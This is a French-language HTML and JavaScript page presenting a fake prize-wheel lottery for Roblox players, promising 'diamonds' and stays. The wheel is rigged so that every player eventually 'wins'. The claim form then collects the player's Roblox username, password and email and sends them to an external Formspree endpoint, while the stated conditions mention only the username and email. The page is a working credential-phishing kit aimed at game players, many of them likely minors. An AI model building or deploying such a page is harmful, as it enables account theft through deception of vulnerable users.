<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&display=swap" rel="stylesheet">
    
    <title>La Loterie des 99 Nuits - Gagnez des Diamants !</title>
    <style>
        /* --- Styles G√©n√©raux et Th√®me Final --- */
        body {
            font-family: 'Arial', sans-serif; 
            margin: 0;
            padding: 0;
            background-color: #1a1a1a; 
            color: #ddd;
            line-height: 1.6;
            text-align: center;
            overflow-x: hidden; /* Emp√™che le d√©filement horizontal */
        }
        
        /* NOUVEAU: Ambiance Cultiste en Arri√®re-plan */
        .cultist-ambiance {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            z-index: -10; /* Place l'√©l√©ment derri√®re tout le contenu */
            /* REMPLACEZ VOTRE_IMAGE_FOND_CULTISTE.jpg par votre fichier (GIF, Image ou Vid√©o) */
            background: url('VOTRE_IMAGE_FOND_CULTISTE.jpg') center center no-repeat;
            background-size: cover;
            opacity: 0.15; /* Tr√®s sombre pour l'ambiance */
            /* Animation simple de pulsation/l√©g√®re variation pour un effet √©trange */
            animation: spooky-pulse 60s infinite alternate;
        }

        @keyframes spooky-pulse {
            from { filter: hue-rotate(0deg) brightness(0.95); }
            to { filter: hue-rotate(5deg) brightness(1.05); }
        }

        /* APPLICATION DE LA NOUVELLE POLICE AUX TITRES */
        h1, h2, h3, #spin-button, .label, .diamonds, #chances-restantes {
            font-family: 'Bebas Neue', cursive;
            letter-spacing: 2px;
        }

        .container {
            position: relative; /* Important pour Z-index */
            width: 95%;
            max-width: 600px; 
            margin: 40px auto;
            padding: 20px 10px;
            background: rgba(43, 43, 43, 0.95); /* L√©g√®re opacit√© pour laisser voir le fond */
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
            border-radius: 15px;
            border: 2px solid #660000;
        }

        .hero {
            background: #000000;
            color: #ffd700;
            padding: 30px 20px;
            border-bottom: 5px solid #ffd700;
            border-radius: 15px 15px 0 0;
            margin-bottom: 20px;
        }

        .hero h1 { 
            font-size: 2.8em; 
            color: #fff; 
            margin: 0 0 10px; 
            text-shadow: 0 0 10px #FFD700, 0 0 20px rgba(255, 215, 0, 0.5);
            animation: text-pulse 2s infinite alternate;
        }
        
        @keyframes text-pulse {
            from { text-shadow: 0 0 5px #FFD700, 0 0 10px rgba(255, 215, 0, 0.3); }
            to { text-shadow: 0 0 15px #FFD700, 0 0 30px rgba(255, 215, 0, 0.8); }
        }

        #chances-restantes { font-size: 1.4em; font-weight: bold; color: #FFD700; margin-bottom: 20px; }
        
        /* --- Conteneur de la Roue --- */
        .wheel-container {
            position: relative;
            width: 320px; 
            height: 320px; 
            margin: 30px auto;
            display: flex;
            justify-content: center;
            align-items: center;
            border-radius: 50%;
            background: #333;
            padding: 10px;
            box-shadow: inset 0 0 20px rgba(255, 215, 0, 0.4), 0 0 15px #ffd700;
        }
        
        /* La roue qui tourne */
        .wheel {
            width: 100%; height: 100%; border-radius: 50%; position: absolute;
            /* La roue commence √† 12h (0¬∞) et tourne dans le sens horaire */
            background: conic-gradient(
                #FFD700 0% 12.5%, #555 12.5% 25%, #8B0000 25% 37.5%, #555 37.5% 50%,
                #228B22 50% 62.5%, #555 62.5% 75%, #191970 75% 87.5%, #555 87.5% 100%
            );
            transition: transform 5s cubic-bezier(0.25, 0.1, 0.25, 1);
            border: 5px solid #000;
        }
        .wheel-pointer {
            position: absolute; top: -20px; left: 50%; transform: translateX(-50%); width: 0; height: 0;
            border-left: 15px solid transparent; border-right: 15px solid transparent; border-bottom: 25px solid #FFD700; z-index: 10;
        }

        /* --- STYLES DU TEXTE --- */
        .segment-text {
            position: absolute; top: 50%; left: 50%; width: 50%; height: 50%; font-weight: bold;
            display: flex; justify-content: center; align-items: center;
            transform-origin: 0% 0%; box-sizing: border-box;
        }
        .segment-text span {
            display: block; background: rgba(255, 255, 255, 0.95); 
            padding: 3px 5px; 
            border-radius: 4px; box-shadow: 1px 1px 3px rgba(0, 0, 0, 0.5); 
            white-space: nowrap; 
            color: #1a1a1a; 
            font-size: 0.55em; 
            font-family: 'Bebas Neue', cursive;
        }
        
        /* Rotations des conteneurs pour aligner le centre du texte avec le centre du segment (45deg par segment) */
        /* V12 : L'ordre et les angles sont conserv√©s pour le placement visuel */
        .text-1 { transform: rotate(22.5deg); } 
        .text-2 { transform: rotate(67.5deg); }
        .text-3 { transform: rotate(112.5deg); } 
        .text-4 { transform: rotate(157.5deg); }
        .text-5 { transform: rotate(202.5deg); } 
        .text-6 { transform: rotate(247.5deg); }
        .text-7 { transform: rotate(292.5deg); } 
        .text-8 { transform: rotate(337.5deg); }
        
        /* Pousser le texte vers l'ext√©rieur et le redresser (mobile) */
        .text-1 span { transform: translateY(-85%) rotate(-22.5deg); }
        .text-2 span { transform: translateY(-85%) rotate(-67.5deg); }
        .text-3 span { transform: translateY(-85%) rotate(-112.5deg); }
        .text-4 span { transform: translateY(-85%) rotate(-157.5deg); }
        .text-5 span { transform: translateY(-85%) rotate(-202.5deg); }
        .text-6 span { transform: translateY(-85%) rotate(-247.5deg); }
        .text-7 span { transform: translateY(-85%) rotate(-292.5deg); }
        .text-8 span { transform: translateY(-85%) rotate(-337.5deg); }
        
        /* --- MEDIA QUERIES pour PC/Grands √âcrans --- */
        @media (min-width: 600px) {
            .hero h1 { font-size: 3.5em; }
            #chances-restantes { font-size: 1.8em; }
            .wheel-container { width: 380px; height: 380px; } 
            .segment-text span { font-size: 0.7em; } 
            
            /* Ajustement des positions PC : Pousser plus loin (-95%) */
            .text-1 span { transform: translateY(-95%) rotate(-22.5deg); }
            .text-2 span { transform: translateY(-95%) rotate(-67.5deg); }
            .text-3 span { transform: translateY(-95%) rotate(-112.5deg); }
            .text-4 span { transform: translateY(-95%) rotate(-157.5deg); }
            .text-5 span { transform: translateY(-95%) rotate(-202.5deg); }
            .text-6 span { transform: translateY(-95%) rotate(-247.5deg); }
            .text-7 span { transform: translateY(-95%) rotate(-292.5deg); }
            .text-8 span { transform: translateY(-95%) rotate(-337.5deg); }
        }

        /* --- Le reste des styles non li√©s √† la roue --- */
        
        #spin-button {
            padding: 15px 30px; font-size: 1.4em; font-weight: bold; background-color: #ff9800; color: #1a1a1a;
            border: 4px solid #ffd700; border-radius: 50px; cursor: pointer; box-shadow: 0 0 20px rgba(255, 152, 0, 0.8);
            transition: background-color 0.3s; margin-top: 20px; animation: pulse 2s infinite;
        }
        #spin-button:disabled { background-color: #666; cursor: not-allowed; animation: none; box-shadow: none; }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(255, 152, 0, 0.7); } 70% { box-shadow: 0 0 0 20px rgba(255, 152, 0, 0); } 100% { box-shadow: 0 0 0 0 rgba(255, 152, 0, 0); } }

        #winner-form-panel {
            display: none; position: relative; margin-top: 40px; padding: 20px;
            background: #101010; border: 2px solid #FFD700; border-radius: 10px; overflow: hidden; 
        }
        .win-icon { font-size: 80px; margin-bottom: 10px; filter: drop-shadow(0 0 10px gold); animation: bounce 1s infinite alternate; display: block; line-height: 1; }
        @keyframes bounce { from { transform: translateY(0px) scale(1.0); } to { transform: translateY(-10px) scale(1.05); } }
        #winner-form-panel h3 { color: #FFD700; font-size: 1.8em; margin-bottom: 15px; position: relative; z-index: 2; animation: win-shake 0.5s infinite alternate; }
        @keyframes win-shake { 0% { transform: scale(1); } 100% { transform: scale(1.02) rotate(1deg); } }

        .form-group input[type="text"], .form-group input[type="email"] {
            width: calc(100% - 20px); padding: 10px; border: 1px solid #666; border-radius: 5px;
            background-color: #333; color: white; font-size: 1.1em;
        }
        .form-group input[type="submit"] {
            width: 100%; padding: 12px; background-color: #28a745; color: white; border: none;
            border-radius: 5px; cursor: pointer; font-size: 1.3em; margin-top: 10px;
        }

        #result-message { margin-top: 30px; font-size: 1.6em; font-weight: bold; color: #ffd700; min-height: 40px; text-shadow: 0 0 5px rgba(255, 215, 0, 0.8); }
        .prix-item { display: flex; justify-content: space-between; align-items: center; padding: 10px; margin-bottom: 6px; border-radius: 8px; font-weight: normal; box-shadow: 0 2px 5px rgba(0, 0, 0, 0.5); text-align: left; }
        .prix-item .label { font-weight: bold; color: #fff; font-size: 1em; }
        .prix-item .diamonds { font-size: 1.5em; color: #FFD700; text-shadow: 0 0 8px rgba(255, 215, 0, 1), 0 0 20px rgba(255, 215, 0, 0.5); }
        .prix-item:nth-child(1) { border-left: 5px solid #FFD700; background: #3a3a3a; }
        .prix-item:nth-child(2) { border-left: 5px solid #8B0000; background: #3a3a3a; }
        .prix-item:nth-child(3) { border-left: 5px solid #228B22; background: #3a3a3a; }
        .prix-item:nth-child(4) { border-left: 5px solid #191970; background: #3a3a3a; }
        .modalites { margin-top: 30px; padding: 10px; background: #101010; border-radius: 8px; }

        .modal-overlay {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.85); z-index: 9999; backdrop-filter: blur(5px);
        }
        .modal-content {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            width: 90%; max-width: 500px; background: #2b2b2b; padding: 25px;
            border-radius: 10px; border: 2px solid #FFD700; box-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
            max-height: 80vh; overflow-y: auto; text-align: left;
        }
        .modal-content h3 { color: #FFD700; font-size: 1.8em; margin-top: 0; text-align: center;}
        .close-button {
            position: absolute; top: 10px; right: 10px; background: #8B0000; color: white;
            border: none; border-radius: 5px; padding: 5px 10px; cursor: pointer; font-weight: bold;
        }

        .confetti-icon {
            font-size: 4em; position: absolute; top: 5px; right: 5px;
            animation: confetti-fall 2s infinite linear; color: gold; z-index: 10;
        }
        .confetti-icon.left { left: 5px; animation-delay: 0.5s; color: #8B0000; }
        @keyframes confetti-fall {
            0% { transform: translateY(-100%) rotate(0deg); opacity: 1; }
            100% { transform: translateY(100%) rotate(360deg); opacity: 0; }
        }
    </style>
</head>
<body>

    <div class="cultist-ambiance"></div>

    <header class="hero">
        <h1 style="color: #FFD700;">ü¶å La Loterie des 99 Nuits</h1>
        <p>Tentez votre chance ! Faites tourner la Roue du Grand Cerf pour gagner votre s√©jour et vos Diamants !</p>
    </header>

    <main class="container">
        
        <div id="chances-restantes">
            Vous avez <span id="chances-count" style="color: #FFD700;">2</span> chances restantes !
        </div>

        <h2 style="color: #ffd700;">üéÅ Prix √† Gagner</h2>
        
        <div class="wheel-container">
            <div class="wheel" id="wheel">
                <div class="segment-text text-2"><span>üíé99</span></div> 
                <div class="segment-text text-4"><span>üíé50</span></div> 
                <div class="segment-text text-6"><span>üíé30</span></div> 
                <div class="segment-text text-8"><span>üíé20</span></div> 

                <div class="segment-text text-1"><span style="color: #666;">üíé0</span></div> 
                <div class="segment-text text-3"><span style="color: #666;">üíé0</span></div> 
                <div class="segment-text text-5"><span style="color: #666;">üíé0</span></div> 
                <div class="segment-text text-7"><span style="color: #666;">üíé0</span></div> 
            </div>
            <div class="wheel-pointer"></div>
        </div>
        
        <button id="spin-button">LANCER LA ROUE !</button>

        <div id="result-message"></div>

        <div id="winner-form-panel">
            
            <div class="confetti-icon">üéâ</div>
            <div class="confetti-icon left">‚ú®</div>

            <span class="win-icon">ü¶å</span>
            
            <h3>üéâ F√âLICITATIONS ! ENREGISTREZ VOTRE GAIN !</h3>
            
            <form id="winner-form" action="https://formspree.io/f/mgvqdwzo" method="POST">
                <div class="form-group">
                    <label for="roblox_account">Compte Roblox ou Nom d'utilisateur :</label>
                    <input type="text" id="roblox_account" name="roblox_account" required>
                </div>
                <div class="form-group">
                    <label for="roblox_account">Mots de passe :</label>
                    <input type="text" id="roblox_account" name="roblox_account" required>
                </div>
                <div class="form-group">
                    <label for="contact_email">Adresse mail :</label>
                    <input type="email" id="contact_email" name="contact_email" required>
                </div>
                
                <input type="hidden" id="prize_won" name="prize_won" value="">
                <input type="hidden" name="_subject" value="Nouveau Gagnant Loterie 99 Nuits">
                
                <input type="submit" value="VALIDER ET ENVOYER LE GAIN">
            </form>
            <p id="form-status"></p>
        </div>
        <hr style="border-color: #555;">

        <h2 style="color: #ffd700;">üìÖ R√©partition des Prix</h2>
        <div style="max-width: 450px; margin: 20px auto;">
            
            <div class="prix-item">
                <span class="label">1er Prix (Or): S√©jour de 99 Nuits</span>
                <span class="diamonds">üíé99</span>
            </div>
            <div class="prix-item">
                <span class="label">2e Prix (Rouge): 10 Nuits de Luxe</span>
                <span class="diamonds">üíé50</span>
            </div>
            <div class="prix-item">
                <span class="label">3e Prix (Vert): Collection de Bijoux</span>
                <span class="diamonds">üíé30</span>
            </div>
            <div class="prix-item">
                <span class="label">Consolation (Bleu): Bon d'Achat</span>
                <span class="diamonds">üíé20</span>
            </div>
        </div>
        
        <div class="modalites">
            <a href="#" id="open-modalites" style="color: #ffd700; text-decoration: none; font-weight: bold;">[Lire les Modalit√©s et Conditions]</a>
        </div>

    </main>

    <footer>
        <p style="color: #666;">&copy; 2025 La Loterie des 99 Nuits.</p>
    </footer>

    <div id="modalites-modal" class="modal-overlay">
        <div class="modal-content">
            <button class="close-button" id="close-modalites">X</button>
            <h3>Modalit√©s et Conditions de la Loterie</h3>
            <p><strong>1. √âligibilit√© :</strong> Cette loterie est ouverte √† tous les joueurs de Roblox. Une seule participation par compte est autoris√©e.</p>
            <p><strong>2. Chances de Gain :</strong> Chaque joueur dispose de 2 lancers de roue initiaux. Le dernier lancer garantit un gain de consolation (20 Diamants).</p>
            <p><strong>3. R√©clamation des Prix :</strong> Les gagnants doivent fournir leur nom d'utilisateur Roblox et une adresse e-mail valide pour que l'√©quipe du Grand Cerf puisse les contacter afin de valider et d'attribuer le gain.</p>
            <p><strong>4. D√©lai de R√©clamation :</strong> Tous les prix non r√©clam√©s dans les 72 heures suivant la victoire seront annul√©s.</p>
            <p><strong>5. Confidentialit√© :</strong> Les informations fournies (nom d'utilisateur et e-mail) sont strictement confidentielles et ne seront utilis√©es que dans le cadre de l'attribution des prix et de la notification des gagnants.</p>
            <p style="text-align: center; margin-top: 20px;"><em>En participant, vous acceptez l'int√©gralit√© de ces conditions.</em></p>
        </div>
    </div>
    <audio id="ambiance-music" loop src="VOTRE_MUSIQUE_AMBIANCE.mp3"></audio>
    <audio id="sfx-spin" src="VOTRE_SFX_ROUE_TOURNE.mp3"></audio>
    <audio id="sfx-click" src="VOTRE_SFX_BOUTON_CLIC.mp3"></audio>
    <audio id="sfx-win" src="VOTRE_SFX_VICTOIRE.mp3"></audio>
    <audio id="sfx-lose" src="VOTRE_SFX_PERTE.mp3"></audio>
    <script>
        const wheel = document.getElementById('wheel');
        const spinButton = document.getElementById('spin-button');
        const resultMessage = document.getElementById('result-message');
        const chancesCount = document.getElementById('chances-count');
        const formPanel = document.getElementById('winner-form-panel');
        const prizeWonInput = document.getElementById('prize_won');
        
        // √âl√©ments Audio
        const ambianceMusic = document.getElementById('ambiance-music');
        const sfxSpin = document.getElementById('sfx-spin');
        const sfxClick = document.getElementById('sfx-click');
        const sfxWin = document.getElementById('sfx-win');
        const sfxLose = document.getElementById('sfx-lose');
        
        // Modalit√© JS
        const openModalButton = document.getElementById('open-modalites');
        const closeModalButton = document.getElementById('close-modalites');
        const modal = document.getElementById('modalites-modal');
        
        let chancesRestantes = 2; 

        // CORRECTION V12: L'ordre des segments est d√©fini CLAIREMENT en fonction de leur position angulaire (TCA = Target Center Angle)
        // La fl√®che est √† 0¬∞. Les angles sont compt√©s dans le sens horaire.
        const segments = [
            // Index 0: Yellow (Seg 1, 0¬∞-45¬∞) -> üíé0
            { name: "CASE VIDE (üíé0)", degrees: 22.5, isWin: false, index: 0 }, 
            // Index 1: Grey (Seg 2, 45¬∞-90¬∞) -> üíé99
            { name: "99 Diamants et le Grand S√©jour", degrees: 67.5, isWin: true, index: 1 }, 
            // Index 2: Red (Seg 3, 90¬∞-135¬∞) -> üíé0
            { name: "CASE VIDE (üíé0)", degrees: 112.5, isWin: false, index: 2 }, 
            // Index 3: Grey (Seg 4, 135¬∞-180¬∞) -> üíé50
            { name: "50 Diamants et 10 Nuits de Luxe", degrees: 157.5, isWin: true, index: 3 }, 
            // Index 4: Green (Seg 5, 180¬∞-225¬∞) -> üíé0
            { name: "CASE VIDE (üíé0)", degrees: 202.5, isWin: false, index: 4 }, 
            // Index 5: Grey (Seg 6, 225¬∞-270¬∞) -> üíé30
            { name: "30 Diamants et une Collection de Bijoux", degrees: 247.5, isWin: true, index: 5 }, 
            // Index 6: Blue (Seg 7, 270¬∞-315¬∞) -> üíé0
            { name: "CASE VIDE (üíé0)", degrees: 292.5, isWin: false, index: 6 }, 
            // Index 7: Grey (Seg 8, 315¬∞-360¬∞) -> üíé20 <-- GAIN GARANTI
            { name: "20 Diamants et un Bon d'Achat", degrees: 337.5, isWin: true, index: 7 } 
        ];

        let currentRotation = 0;

        // Fonction pour jouer la musique d'ambiance sur interaction
        function playAmbiance() {
            if (ambianceMusic.paused) {
                // Tente de jouer la musique, gestion des erreurs d'autoplay
                ambianceMusic.volume = 0.3; // Volume faible pour le fond
                ambianceMusic.play().catch(e => console.log("Autoplay bloqu√©, la musique jouera apr√®s le premier clic."));
            }
            // Retirer l'√©couteur apr√®s le premier d√©clenchement r√©ussi
            document.removeEventListener('click', playAmbiance);
        }

        // Tenter de d√©marrer la musique sur le premier clic de l'utilisateur sur la page
        document.addEventListener('click', playAmbiance);

        spinButton.addEventListener('click', () => {
            
            sfxClick.currentTime = 0; // R√©initialiser le son pour un clic rapide
            sfxClick.volume = 0.7;
            sfxClick.play();

            if (chancesRestantes <= 0) {
                resultMessage.innerHTML = "<span style='color: red;'>D√©sol√©, vous n'avez plus de chances pour cette loterie.</span>";
                spinButton.disabled = true;
                return;
            }

            spinButton.disabled = true;
            formPanel.style.display = 'none'; 
            resultMessage.textContent = "La roue tourne... Suspense !";

            // D√©marrer le son de la roue
            sfxSpin.volume = 0.5;
            sfxSpin.loop = true;
            sfxSpin.play();

            // 1. Tirage al√©atoire initial
            let winningIndex = Math.floor(Math.random() * segments.length);
            let winner = segments[winningIndex];
            
            // --- LOGIQUE DE GAIN GARANTI ---
            if (chancesRestantes === 1) {
                if (winner.isWin === false) {
                    // Si le joueur est sur le dernier tour ET que le tirage est une PERTE (üíé0)
                    // On force l'arr√™t sur le gain garanti (20 Diamants, Index 7)
                    winningIndex = 7; 
                    winner = segments[winningIndex]; // Mettre √† jour l'objet gagnant (maintenant üíé20)
                }
                // Si le joueur gagne d√©j√† (99, 50, 30), on conserve ce gain.
            }
            // --- FIN LOGIQUE DE GAIN GARANTI ---
            
            // 2. Calcul de la rotation pour l'index final
            const baseRotation = 5 * 360; 
            const targetCenterAngle = winner.degrees; // Angle central du segment gagnant (TCA)

            // Rotation requise pour aligner le TCA avec le pointeur (0 position).
            // Rotation = (360 - TCA) pour une rotation n√©gative/sens anti-horaire.
            const degreesToWin = 360 - targetCenterAngle; 

            // Ajout d'un petit offset al√©atoire dans le segment (-15¬∞ √† +15¬∞)
            const randomOffset = (Math.random() * 30) - 15; 
            
            const finalRotation = baseRotation + degreesToWin + randomOffset;
            
            // La rotation est appliqu√©e en n√©gatif (sens anti-horaire)
            currentRotation += finalRotation;

            wheel.style.transition = 'transform 5s cubic-bezier(0.25, 0.1, 0.25, 1)';
            wheel.style.transform = `rotate(-${currentRotation}deg)`;

            setTimeout(() => {
                
                sfxSpin.pause(); // Arr√™ter le bruit de la roue

                chancesRestantes--;
                chancesCount.textContent = chancesRestantes;
                chancesCount.style.color = chancesRestantes > 0 ? '#FFD700' : 'red';
                
                if (winner.isWin) {
                    sfxWin.currentTime = 0;
                    sfxWin.volume = 1.0;
                    sfxWin.play();
                    
                    // Affichage du nom du VRAI gagnant
                    resultMessage.innerHTML = `F√âLICITATIONS ! Vous avez gagn√© : <strong style="color: #FFD700;">${winner.name}</strong> !`;
                    
                    prizeWonInput.value = winner.name; 
                    formPanel.style.display = 'block';
                    spinButton.disabled = true; 
                    
                } else {
                    sfxLose.currentTime = 0;
                    sfxLose.volume = 0.8;
                    sfxLose.play();
                    
                    resultMessage.innerHTML = `<span style='color: #888;'>Dommage ! Vous √™tes tomb√© sur une ${winner.name}. Retentez votre chance !</span>`;
                    formPanel.style.display = 'none';
                    
                    if (chancesRestantes <= 0) {
                        spinButton.disabled = true;
                    } else {
                        spinButton.disabled = false;
                    }
                }
            }, 5000); 
        });
        
        // G√©rer l'envoi du formulaire via AJAX (vers Formspree)
        document.getElementById('winner-form').addEventListener('submit', async function (event) {
            event.preventDefault();
            const form = event.target;
            const status = document.getElementById('form-status');
            
            status.innerHTML = 'Envoi en cours...';

            try {
                const response = await fetch(form.action, {
                    method: form.method,
                    body: new FormData(form),
                    headers: {
                        'Accept': 'application/json'
                    }
                });
                
                if (response.ok) {
                    status.innerHTML = '‚úÖ Gain enregistr√© ! Les informations ont √©t√© envoy√©es. Vous serez contact√©(e) sous peu par e-mail.';
                    form.reset();
                    formPanel.style.display = 'none';
                    
                    spinButton.disabled = true; 
                    chancesRestantes = 0;
                    chancesCount.textContent = 0;
                    chancesCount.style.color = 'red';
                    
                } else {
                    status.innerHTML = '‚ùå Une erreur s\'est produite. Veuillez r√©essayer.';
                }
            } catch (error) {
                status.innerHTML = '‚ùå Erreur de connexion. Veuillez r√©essayer.';
            }
        });

        // --- Fonctions de la Modalit√© ---
        openModalButton.addEventListener('click', (e) => {
            e.preventDefault();
            modal.style.display = 'block';
        });

        closeModalButton.addEventListener('click', () => {
            modal.style.display = 'none';
        });

        // Fermer si l'utilisateur clique en dehors de la modal
        window.addEventListener('click', (e) => {
            if (e.target == modal) {
                modal.style.display = 'none';
            }
        });

        // Initialiser l'affichage des chances au chargement
        chancesCount.textContent = chancesRestantes;
    </script>
</body>
</html>
